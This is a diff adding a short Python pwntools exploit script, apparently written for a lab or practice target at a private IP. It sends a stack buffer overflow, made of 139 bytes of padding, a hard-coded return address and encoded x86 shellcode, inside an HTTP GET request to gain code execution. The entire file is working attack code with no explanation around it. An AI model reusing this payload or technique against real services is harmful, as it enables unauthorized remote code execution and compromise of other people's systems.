@@ -1,0 +1,32 @@
+#!/usr/bin/python
+from pwn import *
+import struct
+
+# Connecting to service
+s = remote("192.168.135.133", 20000)
+
+# Getting the first lines
+print s.recvuntil(":-)\n")
+
+shellcodeBuffer = struct.pack("I", 0xbffff995)
+
+# # Setting the shellcode
+shellcode =  ""
+shellcode += "\xba\x3a\x47\xce\x7a\xdb\xd2\xd9\x74\x24\xf4\x58"
+shellcode += "\x31\xc9\xb1\x12\x83\xc0\x04\x31\x50\x0e\x03\x6a"
+shellcode += "\x49\x2c\x8f\xbb\x8e\x47\x93\xe8\x73\xfb\x3e\x0c"
+shellcode += "\xfd\x1a\x0e\x76\x30\x5c\xfc\x2f\x7a\x62\xce\x4f"
+shellcode += "\x33\xe4\x29\x27\x04\xbe\x4d\xb6\xec\xbd\x51\xa9"
+shellcode += "\xb0\x48\xb0\x79\x2e\x1b\x62\x2a\x1c\x98\x0d\x2d"
+shellcode += "\xaf\x1f\x5f\xc5\x5e\x0f\x13\x7d\xf7\x60\xfc\x1f"
+shellcode += "\x6e\xf6\xe1\x8d\x23\x81\x07\x81\xcf\x5c\x47"
+
+# # Setting up padding
+padding = "A"*139
+
+# # Setting up payload
+payload = padding + shellcodeBuffer
+
+s.sendline("GET {0} HTTP/1.1 {1}".format(payload, shellcode))
+
+print s.recvall()
